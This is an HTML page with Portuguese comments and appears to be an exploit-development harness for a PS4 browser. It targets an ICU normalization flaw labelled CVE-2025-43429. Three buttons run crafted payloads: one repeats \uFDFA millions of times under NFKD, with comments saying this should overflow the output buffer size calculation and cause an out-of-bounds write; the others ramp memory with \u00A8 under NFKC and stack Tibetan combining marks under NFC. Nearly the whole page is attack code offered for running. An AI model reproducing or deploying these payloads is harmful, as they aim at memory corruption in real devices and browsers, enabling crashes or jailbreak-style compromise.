<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU CVE-2025-43429 (Final Phase)</title>
    <style>
        body { font-family: 'Courier New', monospace; padding: 20px; background-color: #000; color: #0f0; }
        h1 { color: #fff; border-bottom: 2px solid #555; padding-bottom: 10px; }
        .controls { margin-bottom: 20px; background: #222; padding: 15px; border-radius: 8px; border: 1px solid #444; }
        button { 
            display: block;
            width: 100%;
            margin: 10px 0; 
            padding: 15px; 
            font-size: 16px; 
            font-weight: bold;
            cursor: pointer; 
            background-color: #333; 
            color: #fff; 
            border: 1px solid #666; 
            border-radius: 4px;
            transition: background 0.2s;
        }
        button:hover { background-color: #555; }
        button.danger { background-color: #900; border-color: #f00; }
        
        #log { 
            height: 400px; 
            border: 1px solid #0f0; 
            overflow-y: scroll; 
            padding: 10px; 
            background: #111; 
            font-size: 14px;
            white-space: pre-wrap;
        }
        .error { color: #ff5555; }
        .highlight { color: #ffff55; }
        .success { color: #55ff55; font-weight: bold; }
    </style>
</head>
<body>
    <h1>CVE-2025-43429: ICU "Expansion Bomb"</h1>
    
    <div class="controls">
        <p>Status: Teste G deu OOM. Mudando estratégia para Alta Expansão.</p>
        <button onclick="test218j_MicroRamp()">Test 218j: Micro-Rampa (0.10 -> 0.20)</button>
        <button class="danger" onclick="test218k_ArabicBomb()">Test 218k: Bomba Árabe (1 char -> 18 chars)</button>
        <button class="danger" onclick="test218l_TibetanStack()">Test 218l: Pilha Tibetana (Complex Expansion)</button>
        <hr style="border-color: #555;">
        <button onclick="clearLog()">Limpar Log</button>
    </div>

    <div id="log">=== PRONTO ===</div>

    <script>
        const log = document.getElementById('log');

        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            if (type === 'error') div.className = 'error';
            if (type === 'highlight') div.className = 'highlight';
            if (type === 'success') div.className = 'success';
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '=== LOG LIMPO ===';
        }

        function forceGC() {
            try {
                if (window.gc) window.gc();
            } catch(e) {}
        }

        // =================================================================
        // VARIAÇÃO J: Micro-Rampa (Cirúrgico)
        // Objetivo: Começar MUITO baixo (0.10) e subir devagar.
        // O teste G começou em 0.22 e já deu OOM. Precisamos achar o ponto antes disso.
        // =================================================================
        function test218j_MicroRamp() {
            addLog('>>> INICIANDO TESTE 218j (Micro-Rampa) <<<', 'highlight');
            
            let len = 0x7FFFFFF0;
            let expandChar = "\u00A8";
            let fillChar = "a";
            
            let currentFactor = 0.10; // Começa bem baixo
            const maxFactor = 0.22;   // Para antes do ponto de OOM do teste G
            const step = 0.005;       // Passos minúsculos

            async function stepTest() {
                if (currentFactor > maxFactor) {
                    addLog('Fim da rampa. Tente o teste 218k.', 'success');
                    return;
                }

                addLog(`[Passo] Fator: ${currentFactor.toFixed(3)}...`);
                
                try {
                    forceGC(); // Tenta limpar RAM antes de alocar
                    
                    let numExpandChars = 16;
                    let fillLen = len - numExpandChars;
                    
                    // Alocação
                    let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * currentFactor));
                    
                    // Trigger
                    let res = largeStr.normalize('NFKC');
                    
                    // Se chegou aqui, limpa imediatamente
                    largeStr = null;
                    res = null;
                    
                    addLog(`   -> OK. RAM liberada.`);
                    
                    currentFactor += step;
                    setTimeout(stepTest, 800); // Pausa longa para o sistema respirar
                    
                } catch(e) {
                    if (e.message.includes("Out of memory")) {
                        addLog(`   -> OOM atingido em ${currentFactor.toFixed(3)}.`, 'error');
                        // Não para, tenta limpar e continuar só mais um pouco com GC forçado
                        largeStr = null;
                        forceGC();
                        // Parar teste aqui pois atingimos o teto físico
                    } else {
                        addLog(`   -> Erro: ${e.message}`, 'error');
                        currentFactor += step;
                        setTimeout(stepTest, 800);
                    }
                }
            }

            stepTest();
        }

        // =================================================================
        // VARIAÇÃO K: A Bomba Árabe (Melhor chance de Crash sem OOM)
        // O caractere \uFDFA (ﷺ) expande para "sallallahou alayhe wasallam" (18 chars).
        // Input: 30MB -> Output: 540MB.
        // O navegador aloca pouco na entrada (evita OOM inicial) mas calcula errado o buffer de saída.
        // =================================================================
        function test218k_ArabicBomb() {
            addLog('>>> INICIANDO TESTE 218k (Bomba Árabe) <<<', 'highlight');
            addLog('Estratégia: Usar ligadura \uFDFA (1 -> 18 chars) para estourar o buffer de saída com input pequeno.');
            
            try {
                let bombChar = "\uFDFA"; 
                
                // Vamos ser conservadores no input: Apenas 25MB.
                // Isso é trivial para o PS4 alocar.
                let inputSize = 1024 * 1024 * 25; 
                
                addLog(`1. Alocando Input seguro (~${inputSize/1024/1024} MB)...`);
                
                let s = bombChar.repeat(inputSize); // ~50MB na RAM (2 bytes por char)
                
                // O cálculo interno da ICU vai tentar reservar espaço para 25M * 18 chars
                // Isso deve causar o Integer Overflow no cálculo de tamanho, 
                // fazendo ele alocar um buffer pequeno e escrever muito além dele.
                addLog(`2. Input pronto. Disparando normalize('NFKD')...`, 'highlight');
                addLog('   (NFKD é usado para decomposição de compatibilidade)');
                
                let normalized = s.normalize('NFKD');
                
                addLog('Falha: O navegador protegeu a operação.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }

        // =================================================================
        // VARIAÇÃO L: Pilha Tibetana (Complexidade Extrema)
        // Empilha caracteres combinantes. Isso força a ICU a usar algoritmos 
        // recursivos de normalização que consomem stack e heap.
        // =================================================================
        function test218l_TibetanStack() {
            addLog('>>> INICIANDO TESTE 218l (Pilha Tibetana) <<<', 'highlight');
            
            try {
                // Caractere base + múltiplos combinantes
                // \u0F43 (GH) + \u0F71 (Vowel A) + \u0F72 (Vowel I) ...
                let stack = "\u0F43\u0F92\u0F71\u0F72\u0F74\u0F84"; 
                
                let count = 1024 * 1024 * 5; // 5 milhões de pilhas
                
                addLog(`1. Criando string complexa (~${(count * stack.length * 2)/1024/1024} MB)...`);
                
                let s = stack.repeat(count);
                
                addLog('2. Disparando normalize("NFC")...', 'highlight');
                // NFC força composição canônica, que é computacionalmente cara
                // e pode falhar em verificações de limite.
                
                let normalized = s.normalize('NFC');
                
                addLog('Falha: Operação concluída.', 'error');
            } catch(e) {
                addLog('ERRO: ' + e.message, 'error');
            }
        }
    </script>
</body>
</html>
